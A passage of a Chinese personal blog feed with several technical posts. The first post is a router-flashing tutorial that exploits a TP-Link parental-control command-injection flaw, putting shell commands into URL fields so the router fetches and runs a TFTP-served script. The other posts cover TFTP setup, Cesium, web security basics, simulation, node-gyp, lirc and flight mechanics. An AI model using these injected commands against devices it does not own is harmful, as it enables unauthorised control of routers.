    <content type="text"><![CDATA[我的TL-WR703N路由器运行不稳定，就准备尝试刷最新的OpenWRT，看看能否好一点。 准备工作 一个 TP-Link TL-WR703N 路由器，确保固件版本为 3.17.1 Build 140120 Rel.56593n 1# 在刷机之前，按reset按钮重置路由器 TL-WR703N 的 openwrt 固件 openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin 1234# 下载openwrt固件并拆分成两份（因为wr703n的内存很小，可能传输的时候传不了整个文件）curl https://downloads.openwrt.org/snapshots/trunk/ar71xx/generic/openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin -o openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bindd if=openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin of=i1 bs=1 count=1048576dd if=openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin of=i2 bs=1 skip=1048576 TFTP 服务器 12# 安装TFTP的客户端和服务器端sudo apt-get install atftp atftpd busybox 1.16.1 MIPS 版 1curl https://busybox.net/downloads/binaries/1.21.1/busybox-mips &gt; busybox 编写Hack脚本 12345678cd /tmptftp -gl i1 192.168.1.100 # 把i1从tftp服务器下载下来，这里的ip应该是，你的tftp服务器连接路由器之后，ifconfig看到的iptftp -gl i2 192.168.1.100 # 把i2从tftp服务器下载下来tftp -gl busybox 192.168.1.100 # 把busybox从tftp服务器下载下来chmod 755 busybox # 修改busybox权限以执行命令./busybox dd if=i1 of=/dev/mtdblock1 conv=fsync # 将i1写入磁盘分区./busybox dd if=i2 of=/dev/mtdblock2 conv=fsync # 将i2写入磁盘分区reboot -f # 重启，会启动openwrt 刷机流程在V1.7以前，可以通过路由器的Web UI直接将openwrt刷到板子上，但在V1.7之后，只能通过利用TP-LINK家长控制的漏洞，让路由板执行一些代码，成功刷写openwrt系统。本教程就是利用TP-LINK家长控制的漏洞进行openwrt刷机。下面介绍openwrt刷机的步骤。 搭建tftp服务器在Debian操作系统中搭建tftp服务器请参考链接4。将busybox、 拆开的固件i1和i2、Hack脚本aa放入tftp服务器目录。 Hack into TL-WR703N这个方法是利用TPLINK家长控制漏洞，以curl的方式执行命令，让路由器从tftp服务器上下载脚本，执行命令，从而将openwrt固件写入路由器。 【警告】以下步骤可能导致你的路由器变砖，请确认当前的路由器固件版本是3.17.1 Build 140120. 下述全过程请勿断开连接或是断开电源，本人不对产生的任何后果负责！另外，每一步都很重要，别忽略其中任何一步。一旦变砖，请用3.3V的串口线抢救。 步骤如下： 长按reboot按钮将路由器恢复出厂设置 将tftp服务器通过WiFi的方式连接到路由器 TL-WR703N，ifconfig记住tftp服务器的ip，我的是192.168.1.100 在tftp服务器上执行如下命令修改路由器WebUI默认管理员密码 12# 此处修改密码为admin42，注意Cookies中认证变量Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D即是设置管理员密码为admin42。后续将继续使用该变量进行其他操作，如果认证变量不正确，操作将无法执行。curl -o - -b &apos;tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=true&apos; &apos;http://192.168.1.1/&apos; 启用家长控制（利用漏洞） 1curl -o - -b &apos;tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=&apos; --referer &apos;http://192.168.1.1/userRpm/ParentCtrlRpm.htm&apos; &apos;http://192.168.1.1/userRpm/ParentCtrlRpm.htm?ctrl_enable=1&amp;parent_mac_addr=00-00-00-00-00-02&amp;Page=1&apos; 让路由器从tftp服务器下载并执行脚本12# 执行下述命令后，等待大约三分钟，路由器会重启进入openwrt系统，状态灯会闪烁一会儿curl -o - -b &apos;tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=&apos; --referer &apos;http://192.168.1.1/userRpm/ParentCtrlRpm.htm?Modify=0&amp;Page=1&apos; &apos;http://192.168.1.1/userRpm/ParentCtrlRpm.htm?child_mac=00-00-00-00-00-01&amp;lan_lists=888&amp;url_comment=test&amp;url_0=;cd%20/tmp;&amp;url_1=;tftp%20-gl%20aa%20192.168.1.100;&amp;url_2=;sh%20aa;&amp;url_3=&amp;url_4=&amp;url_5=&amp;url_6=&amp;url_7=&amp;scheds_lists=255&amp;enable=1&amp;Changed=1&amp;SelIndex=0&amp;Page=1&amp;rule_mode=0&amp;Save=%B1%A3+%B4%E6&apos; openwrt系统配置openwrt默认使用LuCI 用户界面，具体配置方法暂时没有时间研究。 参考链接 给 v1.7 版本的 TL-WR703N 刷 openwrt,by Cubic Zone. TL-WR703N v1.7刷openwrt,by 梦里茶. TP-Link TL-WR703N,by openwrt. Debian安装配置使用TFTP,by jack huang.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Debian安装配置使用TFTP]]></title>
    <url>%2F2018%2F12%2F30%2FDebian%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8TFTP%2F</url>
    <content type="text"><![CDATA[简单文件传输协议也称小型文件传输协议（Trivial File Transfer Protocol, TFTP），是一种简化的文件传输协议（FTP），通过少量存储器就能轻松实现。 TFTP技术信息小型文件传输协议的一些详细资料： 使用UDP（端口69）作为其传输协议（不像FTP使用TCP端口21）。 不能列出目录内容。 无验证或加密机制。 被用于在远程服务器上读取或写入文件。 支持三种不同的传输模式：”netascii”,”octet”和”mail”，前两种匹配FTP协议中的”ASCII”和”image（binary）”模式；第三种从来很少使用，当前已经废弃。 TFTP安装安装TFTP的客户端和服务器端：1sudo apt-get install atftp atftpd TFTP配置 创建TFTP服务器目录 123sudo mkdir /tftpbootsudo chmod 777 /tftpbootsudo chmod 777 /tftpboot/* 编辑TFTP配置文件 12345sudo gedit /etc/default/atftpd# 修改内容如下，主要是修改目录USE_INETD=falseOPTIONS=&quot;--daemon --port 69 --retry-timeout 5 --mcast-port 1758 --mcast-addr 239.239.239.0-255 --mcast-ttl 1 --maxthread 100 --verbose=5 /tftpboot&quot; 重启TFTP守护程序 1sudo /etc/init.d/atftpd restart TFTP测试123456789~$ sudo tftp 192.168.43.116tftp&gt; statusConnected to 192.168.43.116.Mode: netascii Verbose: off Tracing: offRexmt-interval: 5 seconds, Max-timeout: 25 secondstftp&gt; get iproad.txtReceived 959 bytes in 0.0 secondstftp&gt; put upload.txtSent 13 bytes in 0.0 seconds 参考链接 TFTP,by wikipedia. Using TFTP to Install Malicious Software on the Target,by kail forum.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
        <tag>计算机安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cesium中3D模型的驱动方法]]></title>
    <url>%2F2018%2F12%2F26%2FCesium%E4%B8%AD3D%E6%A8%A1%E5%9E%8B%E7%9A%84%E9%A9%B1%E5%8A%A8%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Cesium中3D模型的运动可以使用CZML直接驱动，但使用该方法前提是能事先计算出3D模型的运动轨迹，具有很大的局限性。那么如何实时驱动3D模型呢？ Cesium渲染过程分析Cesium渲染过程的分析可以参考链接1。Cesium的渲染始于虚拟地球组件CesiumWidget的startRenderLoop方法，在该方法中将调用requestAnimationFrame函数开始渲染。 虚拟地球组件CesiumWidget包含Scene组件，在其render方法随后调用Scene的render方法。在场景组件Scene的render方法中提供了preUpdate、postUpdate、preRender、postRender四个事件对象，这四个事件对象将是我们实时驱动3D模型的关键。 preUpdate事件在Cesium更新渲染周期开始之前以目标帧率触发preUpdate事件。 123456scene.postUpdate.addEventListener(function() &#123; // This code will run at 60 FPS if (changeToPromptRender) &#123; scene.requestRender(); &#125;&#125;); postUpdate事件在场景更新之后，新帧渲染之前以目标帧率触发postUpdate事件。 preRender事件在场景更新之后，新帧渲染之前触发preRender事件。 1234scene.preRender.addEventListener(function() &#123; // This code will run when a new frame is rendered // including when changeToPromptRender is true&#125;); postRender事件在新帧渲染之后触发postRender事件。 实时驱动3D模型从上一节对Cesium渲染过程分析可知，要实时驱动3D模型，应订阅场景Scene的preUpdate事件，在preUpdate事件的处理函数中改变3D模型的位置和姿态。 订阅preUpdate事件123456789101112131415//订阅场景的preUpdate事件viewer.scene.preUpdate.addEventListener(function(scene, time) &#123; speedVector = Cesium.Cartesian3.multiplyByScalar(Cesium.Cartesian3.UNIT_X, speed / 10, speedVector); position = Cesium.Matrix4.multiplyByPoint(planePrimitive.modelMatrix, speedVector, position); pathPosition.addSample(Cesium.JulianDate.now(), position); Cesium.Transforms.headingPitchRollToFixedFrame(position, hpRoll, Cesium.Ellipsoid.WGS84, fixedFrameTransform, planePrimitive.modelMatrix); if (fromBehind.checked) &#123; // Zoom to model Cesium.Matrix4.multiplyByPoint(planePrimitive.modelMatrix, planePrimitive.boundingSphere.center, center); hpRange.heading = hpRoll.heading; hpRange.pitch = hpRoll.pitch; camera.lookAt(center, hpRange); &#125;&#125;); 获取czml实体的参数1234567891011121314151617viewer.scene.preUpdate.addEventListener(function(scene, time) &#123; //target是czml实体对象 //获取time时刻target的位置参数 target.position.getValue(time,position) console.log(position) target.orientation.getValue(time,orientation) console.log(orientation)&#125;);viewer.scene.preUpdate.addEventListener(function(scene, time) &#123; var pos=target.position.getValue(time) console.log(pos.toString()) //世界坐标转经纬高 var cartographicPosition = Cesium.Ellipsoid.WGS84.cartesianToCartographic(pos); console.log(cartographicPosition.toString())&#125;); 使用Entity API加载3D模型1234567891011121314151617var viewer = new Cesium.Viewer(&apos;cesiumContainer&apos;);var center=Cesium.Cartesian3.fromDegrees(-123.0744619, 44.0503706,100);var hpr=Cesium.HeadingPitchRoll.fromDegrees(90,-90,0);//从headingPitchRoll转四元数var quatern=Cesium.Transforms.headingPitchRollQuaternion(center,hpr);var entity = viewer.entities.add(&#123; position :center , orientation:quatern , model : &#123; uri : &apos;../../../../Apps/SampleData/models/missile.glb&apos;, scale: 0.1, minimumPixelSize:50, maximumScale:5000 &#125;&#125;);viewer.trackedEntity = entity; 使用Primitive API加载3d模型123456789101112var viewer = new Cesium.Viewer(&apos;cesiumContainer&apos;);var center1=Cesium.Cartesian3.fromDegrees(-123.0744619, 44.0503706,100);var hpr1=Cesium.HeadingPitchRoll.fromDegrees(90,-90,100);//计算模式矩阵，实现本地坐标系坐标到世界坐标系坐标的转换var modelMatrix=Cesium.Transforms.headingPitchRollToFixedFrame(center1, hpr1)var model = viewer.scene.primitives.add(Cesium.Model.fromGltf(&#123; url : &apos;../../../../Apps/SampleData/models/missile.glb&apos;, modelMatrix : modelMatrix, scale : 1.0&#125;)); 参考链接 Cesium摄像头跟踪飞机实体时晃动问题分析,by jack huang. Improving Performance with Explicit Rendering, by Gabby Getz.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络安全攻防技术探讨]]></title>
    <url>%2F2018%2F12%2F22%2FWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF%E6%8E%A2%E8%AE%A8%2F</url>
    <content type="text"><![CDATA[网络安全（英语：network security）包含网络设备安全、网络信息安全、网络软件安全。在此重点探讨网络软件安全中的Web安全。当前Web安全面临的压力越来越大，一方面是Web应用一统江湖，君临天下，另一方面针对Web应用的攻击越来越多，攻击方法越来越成熟。下面重点介绍常见的Web攻击方法。 XSSXSS (Cross Site Script，跨站脚本攻击)的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的。 非持久型 XSS持久型 XSSCSRFCSRF（Cross-Site Request Forgery,跨站请求伪造攻击）可以盗用你的登陆信息，以你的身份模拟发送各种请求。 SQL 注入SQL 注入漏洞（SQL Injection）是 Web 开发中最常见的一种安全漏洞。可以用它来从数据库获取敏感信息，或者利用数据库的特性执行添加用户，导出文件等一系列恶意操作，甚至有可能获取数据库乃至系统用户最高权限。 命令行注入命令行注入漏洞，指的是攻击者能够通过 HTTP 请求直接侵入主机，执行攻击者预设的 shell 命令。 DDoS 攻击DDoS 又叫分布式拒绝服务，全称 Distributed Denial of Service，其原理就是利用大量的请求造成资源过载，导致服务不可用。 网络层 DDoS应用层 DDoS流量劫持流量劫持是黑产行业的一大经济支柱。 DNS 劫持HTTP 劫持参考链接 Advanced web security topics,by George. 网络安全,by wikipedia. 常见 Web 安全攻防总结,by zoumiaojiang.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机安全</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[科学研究中阅读论文的方法]]></title>
    <url>%2F2018%2F12%2F20%2F%E7%A7%91%E5%AD%A6%E7%A0%94%E7%A9%B6%E4%B8%AD%E9%98%85%E8%AF%BB%E8%AE%BA%E6%96%87%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[在科学研究的过程中，选题十分重要。因此在初步确定好选题方向后，应对该选题方向进行调研。调研的主要工作就是寻找该方向的论文，进行阅读、分析、总结，了解该方向的过去和现在，并预测未来可能的发展方向。对于刚上研究生的同学，该采用什么样的方法来整理选题方向上的论文，使之符合逻辑，并且条理清晰呢？偶尔拜读了Flood Sung写的文章”深度学习论文阅读路线图“，觉得深受启发，将其所提出的深度学习论文阅读路线图构建原则记录备忘一下。 路线图的构建原则有以下四个原则： 从整体到局部。即从Survey的文章，影响大局的文章到具体子问题子领域的文章。 从过去到最前沿。即每个topic的文章是按照时间顺序排列的，这样大家就可以清楚的看到这个方向的研究发展脉络。 从通用到应用。即有些深度学习的文章是面向深度学习通用理论，比如Resnet，可以用在任意的神经网络中，而有些文章则是具体应用，比如Image Caption。 面向最前沿。收集的文章会有很多是最新的，甚至就是几天前出来的，这样能保证路线图是最新的。 每一种topic只选择最有代表性的几篇文章，比如深度增强学习（Deep Reinforcement Learning），这个领域现在有几十篇文章，但只选择几篇，要深入了解甚至做为自己的研究方向，还需要进一步的阅读该领域的文章。 参考链接 深度学习论文阅读路线图 Deep Learning Papers Reading Roadmap,by Flood Sung. Deep Learning Papers Reading Roadmap,by Flood Sung.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[系统仿真中一些问题的思考]]></title>
    <url>%2F2018%2F12%2F18%2F%E7%B3%BB%E7%BB%9F%E4%BB%BF%E7%9C%9F%E4%B8%AD%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[系统仿真（system simulation）就是根据系统分析的目的，在分析系统各要素性质及其相互关系的基础上，建立能描述系统结构或行为过程的、且具有一定逻辑关系或数量关系的仿真模型，据此进行试验或定量分析，以获得正确决策所需的各种信息。 系统仿真与仿真游戏的区别系统仿真与仿真游戏本质上没有区别，都是计算机程序对现实的模拟，所不同的是各自对仿真保真度（Simulation Fidelity）的要求不同。 仿真保真度（Simulation Fidelity）用于描述仿真精度，模拟真实对应物有多近似： 低保真：对系统的最小模拟，接受输入产生输出 中等保真：对刺激能自动响应，有限精度 高保真：接近不可辨识或者尽可能地接近真实系统 通常系统仿真对仿真保真度的要求比仿真游戏要高。 计算步长与采样周期采用计算机进行数值模拟或系统仿真时，经常需要采用数值解法求解模型方程。系统模型一般采用微分方程描述（也有其它形式），采用数值方法求解，就是采用迭代法逐步逼近。 计算步长积分与微分是互逆。对一个曲线（包括直线）方程求积分，其实就是求曲线与横轴围成的面积。该面积可以用一系列间隔很小的面积块相加得到。这些小间隔的宽度就是计算步长。显然，纯粹从精度的角度考虑，步长越小越精确，因为近似面积更接近实际图形面积。 采样周期采样周期是对一个实际信号测量时，相邻两次测量之间的时间间隔。有时候，采样周期和计算步长相似，但采样周期要考虑实际限制，且是时间单位，而计算步长不一定是时间单位，且相对自由些。两者在数值上没必然联系。对于同一问题，且都是时间量纲的话，采样周期大于等于计算步长，前者是后者的整数倍。 系统仿真包含系统模型求解，也就是在每个采样周期内，要解出模型方程。控制系统仿真时在采样周期内要解出两个模型方程：控制器模型和系统模型。 一个采样周期内可对系统模型迭代求解一次或多次。 计算步长和采样周期大小的选择关于采样周期和计算步长的选择，一般考虑以下因素： 从求解精度考虑，越小越好。 从计算量考虑，越大越好。 采样周期与每秒帧数(Frames Per Second，FPS)采样周期以秒为单位，则 FPS=\frac{1}{采样周期}FPS是指每秒画面重绘的次数，用于衡量画面切换速度。FPS越大，则动画效果越平滑，当FPS小于20时，一般就能明显感受到画面的卡滞现象。 当FPS足够大(比如达到60)，再增加帧数人眼也不会感受到明显的变化，反而相应地就要消耗更多资源(比如电影的胶片就需要更长了，或是电脑刷新画面需要消耗计算资源等等)。因此，选择一个适中的FPS即可。 NTSC标准的电视FPS是30，PAL标准的电视FPS是25，电影的FPS标准为24。 WebGL动画WebGL是一种JavaScript API，用于在不使用插件的情况下在任何兼容的网页浏览器中呈现交互式2D和3D图形。但要产生WebGL动画，需要对运动的场景不停的采样，即不停地拍照。JavaScript的采样函数主要有setInterval方法和requestAnimationFrame方法。 setInterval方法 如果要设置特定的FPS(虽然严格来说，即使使用这种方法，JavaScript也不能保证帧数精确性)，可以使用JavaScript DOM定义的方法： 1setInterval(fn,mesc) 其中，fn是每过msec毫秒执行的函数，如果将fn定义为重绘画面的函数，就能实现动画效果。setInterval函数返回一个变量timer，如果需要停止重绘，需要使用clearInterval方法，并传入该变量timer。 requestAnimationFrame方法 大多数时候，我们并不在意多久重绘一次，这时候就适合用requestAnimationFrame方法了。它告诉浏览器在合适的时候调用指定函数，通常可能达到60FPS。 requestAnimationFrame同样有对应的cancelAnimationFrame取消动画 和setInterval不同的是，由于requestAnimationFrame只请求一帧画面，因此，除了在init函数中需要调用，在被其调用的函数中需要再次调用requestAnimationFrame 使用stat.js记录FPSstat.js是Three.js的作者Mr.Doob的另一个有用的JavaScript库。很多情况下，我们希望知道实时的FPS信息，从而更好地监测动画效果。这时候，stat.js就能提供一个很好的帮助，它占据屏幕中的一小块位置(如左上角)，显示实时的FPS信息。 在HTML中引用stat.js:1&lt;script type=&quot;text/javascript&quot; src=&quot;//mrdoob.github.io/stats.js/build/stats.min.js&quot;&gt;&lt;/script&gt; 再使用如下代码监视实时FPS：1234567891011121314151617var stats = new Stats();stats.showPanel( 1 ); // 0: fps, 1: ms, 2: mb, 3+: customdocument.body.appendChild( stats.dom );function animate() &#123; stats.begin(); // monitored code goes here stats.end(); requestAnimationFrame( animate );&#125;requestAnimationFrame( animate ); 参考链接 计算步长和采样周期,by 王永林. 离散和连续模拟之间的实际区别是什么？,by UF Game. 系统仿真,by 百度百科. 开源的物理引擎,by M. Jones. 数值分析,by wikipedia. three.js 入门详解(二),by Levi. WebGL,by wikipedia. stats.js, by mydoob. 详解JavaScript中的Event Loop（事件循环）机制,by 暮雨清秋.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机仿真</tag>
        <tag>WebGL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[撰写学术论文的思考]]></title>
    <url>%2F2018%2F12%2F17%2F%E6%92%B0%E5%86%99%E5%AD%A6%E6%9C%AF%E8%AE%BA%E6%96%87%E7%9A%84%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[迫于学业和工作的压力，撰写了不少的学术论文。但是并没有对如何撰写学术论文进行思考。看到清华大学的肖寒博士在某个问题下的回答后，感觉茅塞顿开： 不过，一般注水的作者相对而言都是新手，因为比较有经验的研究者都知道：“论文的一切都在于贡献，不在于结果” 你的结果只是一个说明你贡献的例证，多那么点少那么点，大家看了毫无区别。你注水除了恶心我们这些后来实验的人，就没什么别的用处了。有那些疯狂调参和使劲弄技巧的时间，真不如拿来整理好你自己的思路，把论文的论述过程做到有理有据！因为 80.2 和 80.3 正常人都没法记住其间区别，但你循循善诱的精致论述会让所有人印象深刻。我希望新手不要本末倒置！ 论文重在贡献，迫于学业和工作的压力造的注水论文实在无趣！ 参考链接 看图说话的AI小朋友——图像标注趣谈（下）, by 杜客. 从标题到写作流程：写好一篇论文的十条基本原则,by 机器之心.]]></content>
      <tags>
        <tag>科研</tag>
        <tag>感悟</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[node-gyp使用帮助]]></title>
    <url>%2F2018%2F12%2F16%2Fnode-gyp%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9%2F</url>
    <content type="text"><![CDATA[node-gyp是为了编译nodejs addon模块而构建的跨平台命令行工具。nodejs addon模块使用c++语言编写，在源代码级别进行分发，通过node-gyp实现跨平台的编译安装。 背景知识node-gyp源于gyp。gyp是一个用来生成项目文件的工具，刚开始设计给chromium项目使用的。它可以从平台无关的配置生成平台相关的Visual Studio、Xcode、Makefile的项目文件，然后调用 vsbuild、xcode、gcc等编译平台来编译。这就不需要花额外的时间处理每个平台不同的项目配置以及项目之间的依赖关系。 nodejs addon模块采用源代码分发，安装需要根据不同平台采用合适的编译器编译安装，这就是node-gyp项目诞生的原由。 安装过程安装node-gyp在上线情况下，使用如下命令安装node-gyp：1$ npm install -g node-gyp 安装C++编译器根据操作系统平台的不同，需安装对应的编译器，以方便node-gyp调用。以Windows平台为例，安装VC++编译器有两种方法： 直接安装 123// 以管理员身份打开cmd或powershellnpm install --global --production windows-build-tools 手动安装 安装Visual C++构建环境： 使用Visual Studio Build Tools的Visual C++ build tools工作负载或者Visual Studio 2017 Community的Desktop development with C++工作负载。 安装Python 2.7，不支持python3，然后运行npm config set python python2.7 在cmd中运行npm config set msvs_version 2017 手动安装Visual C++构建环境的命令如下：1234567# 使用Visual Studio Build Tools的Visual C++ build tools工作负载，确保安装win10sdk，编译nodejs源码时需要.\vs_buildtools__2041717674.1536666005.exe --layout d:\vc2017_offline --lang zh-CN --add Microsoft.VisualStudio.Workload.MSBuildTools --add Microsoft.VisualStudio.Workload.VCTools --includeRecommended# 使用Visual Studio 2017 Community的Desktop development with C++工作负载.\vs_community__208176120.1522073957.exe --layout e:\vs2017_offline --lang zh-CN --add Microsoft.VisualStudio.Workload.CoreEditor --add Microsoft.VisualStudio.Workload.NativeDesktop --includeRecommended node-gyp编译测试以在Win10平台编译nodejs addon模块为例，在离线情况使用如下命令测试node-gyp是否工作正常：123node-gyp configure --nodedir=d:\node-v8.11.3node-gyp build 参考链接 node-gyp的作用是什么?,by zhihu. node-gyp, by nodejs Windows-Build-Tools, by felixrieseberg. Vistual Studio Community 2017 30天许可证过期,by 井底一蛤蟆.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派使用lirc进行红外遥控测试]]></title>
    <url>%2F2018%2F12%2F15%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E4%BD%BF%E7%94%A8lirc%E8%BF%9B%E8%A1%8C%E7%BA%A2%E5%A4%96%E9%81%A5%E6%8E%A7%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[在树莓派上使用lirc进行红外遥控测试的步骤比较繁琐，记录一下以备忘。 背景知识lirc库LIRC (Linux Infrared remote control,Linux红外线遥控)是一个开放源代码的包。这个包可以让你的Linux系统能够接收及发送红外线信号。 Microsoft Windows上有个功能相同的软件叫WinLIRC。 利用LIRC和红外线接收器，你就几乎可以用所有的红外线遥控器（例如：电视遥控器）来控制你的计算机。举例来说，你可以用遥控器来控制DVD或音乐的播放。 lirc配置文件说明 /etc/lirc/lircd.conf为遥控器配置文件 /etc/lirc/lircmd.conf为lircmd配置文件，后者可以将遥控器用作鼠标。 /etc/lirc/lircrc为irexec配置文件，后者可以在收到遥控器信号号运行设定的程序。 制作遥控器配置文件使用irrecord命令制作遥控器配置文件lircd.conf。12345# 首先停止lirc服务sudo service lirc stop# 制作遥控器配置文件irrecord -d /dev/lirc0 &lt;model&gt;.conf 测试过程硬件 树莓派3B+ 红外接收器 红外遥控器 杜邦线 接线红外接收器都有三个引脚：VCC、GND、Data。其中：VCC：连接5V的引脚GND：连接接地的引脚Data：连接GPIO23 lirc配置 安装lirc: 1sudo apt-get install lirc -y 修改/etc/modules 123456789# /etc/modules: kernel modules to load at boot time.## This file contains the names of kernel modules that should be loaded# at boot time, one per line. Lines beginning with &quot;#&quot; are ignored.i2c-dev# 添加如下代码lirc_devlirc_rpi gpio_in_pin=23 gpio_out_pin=22 修改/etc/lirc/lirc_options.conf 123# 修改如下两项driver = default device = /dev/lirc0 修改/boot/config.txt在/boot/config.txt文件中找到#dtoverlay=lirc-rpi，将其修改如下： 1dtoverlay=lirc-rpi:gpio_in_pin=23,gpio_out_pin=22 重启测试 1234sudo init 6# 查看lirc是否加载成功lsmod | grep lircls /dev/lirc0 参考链接 LIRC,by wikipedia. 树莓派—-红外遥控设置,by 逍遥游. 配置树莓派上的lirc(Raspbian, 2016) ,by Cnly.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[飞行力学中坐标系定义]]></title>
    <url>%2F2018%2F12%2F10%2F%E9%A3%9E%E8%A1%8C%E5%8A%9B%E5%AD%A6%E4%B8%AD%E5%9D%90%E6%A0%87%E7%B3%BB%E5%AE%9A%E4%B9%89%2F</url>
    <content type="text"><![CDATA[建立飞机的运动学模型的前提是建立合适的坐标系，在此基础上才能定义各种参数描述飞机的状态。下面介绍常用的坐标系及常用描述飞机状态的参数。 常用坐标系地面固定坐标轴系($AX_gY_gZ_g$)将地球视为椭球体，则地面固定坐标轴系定义为： 以椭球面上一点为坐标系原点$A$，$Z_g$轴与椭球法线重合，向下为正，$X_g$与$Y_g$轴位于过坐标原地的椭球切平面上,按右手法则建立，$X_g$轴与椭球短半轴重合（北向），$Y_g$轴与地球椭球的长半轴重合（东向）。 在研究坐标转换关系时，常使用飞机牵连铅垂地面固定坐标系$OX_gY_gZ_g$。其原点$O$位于飞机质心，三坐标轴平行于地面固定坐标轴系$AX_gY_gZ_g$的各个轴。飞机姿态——偏航、俯仰、滚转的定义即与飞机牵连铅垂地面固定坐标系有关。 机体坐标系(体轴系$OXYZ$)机体坐标系定义为： 原点$O$位于质心，$O_X$平行于机身轴线或对称面机翼弦线指向前方（机头方向）；$O_Y$垂直于对称面指向右翼；$O_Z$在飞机对称面内，垂直于$O_X$指向下方。符合右手系建立规定。 图1 飞机牵连铅垂地面固定坐标系（OXgYgZg）与体轴系（OXYZ） 航迹坐标系($OX_kY_kZ_k$)航迹坐标系定义： 原点$O$位于飞机质心，$OX_k$沿飞机速度方向；$OZ_k$在$OX_k$所在铅垂平面内，垂直于$OX_k$指向下方；$OY_k$垂直于$OX_k$、$OZ_k$ 所在平面指向右方；符合右手系建立规定。 图2 航迹坐标系（OXkYkZk） 气流坐标轴系(风轴系$OX_aY_aZ_a$)气流坐标轴系又称速度坐标轴系，定义为： 原点$O$位于飞机质心，$OX_a$沿飞机速度方向；$OZ_a$在飞机对称面内，垂直于$OX_a$指向下方；$OY_a$垂直于$OX_a$、$OZ_a$ 所在平面指向右方；符合右手系建立规定。 气动力三个分量（升力、阻力、侧力）是根据风轴系定义的，其中升力与阻力分别沿$OZ_a$、$OX_a$的负向。 半机体坐标系($OX_iY_iZ_i$)半机体坐标系定义为： 原点$O$位于质心，$OX_i$沿飞机速度向飞机对称面内投影方向；$OZ_i$在飞机对称面内，垂直于$OX_i$指向下方；$OY_i$垂直于$OX_i$、$OZ_i$ 所在平面指向右方；符合右手系建立规定。 图3 风轴系（OXaYaZa）与半机体坐标系（OXiYiZi） 稳定性坐标系($OX_sY_sZ_s$)稳定性坐标系定义为： 原点$O$位于质心，$OX_s$沿未受扰动的速度在对称面内的投影方向；$OY_s$在飞机对称面内，指向右；$OZ_s$对称平面内垂直于$OX_s$向下；符合右手系建立规定。 图4 稳定性坐标系（OXsYsZs） 常用飞参 机体坐标系相对于飞机牵连铅垂地面固定坐标系的夹角 偏航角：机体坐标系$x$轴在水平面内投影与$x_g$的夹角，以$\psi$表示 俯仰角：机体坐标系$x$轴与水平面的夹角，以$\theta$表示 滚转角：过机体坐标系$x$轴的铅垂面与机体坐标系$z$轴的夹角，以$\phi$表示 飞行速度矢量相对于体轴系的夹角 迎角：速度矢量在飞机纵向对称面内投影与机体坐标系$x$轴夹角，以$\alpha$表示 侧滑角：速度矢量与飞机纵向对称面的夹角，以$\beta$表示 飞行速度矢量相对于地面的夹角 爬升角：速度与地面水平面夹角，以$\gamma$表示 航迹方位角：速度在地面水平面的投影与$x_g$夹角，以$\chi$表示 参考链接 无人机飞控通俗演义之 纷繁复杂的飞行力学, by 量子黑洞. 一起写飞行仿真之 六自由度动力学方程, by 量子黑洞. 飞行器飞行动力学（二）坐标系与夹角们, by 萝卜. Cesium中飞行器姿态控制,by jack huang. MathJax 支持的 Latex 符号总结(希腊字母和希伯来字母),by liyuanbhu 空间中三维矢量,by tina_ttl. JSBSim学习笔记(3)—— 基本概念,by 么的聊.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行力学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Debian系统安装NVIDIA驱动支持双显卡切换]]></title>
    <url>%2F2018%2F12%2F10%2FDebian%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85NVIDIA%E9%A9%B1%E5%8A%A8%E6%94%AF%E6%8C%81%E5%8F%8C%E6%98%BE%E5%8D%A1%E5%88%87%E6%8D%A2%2F</url>
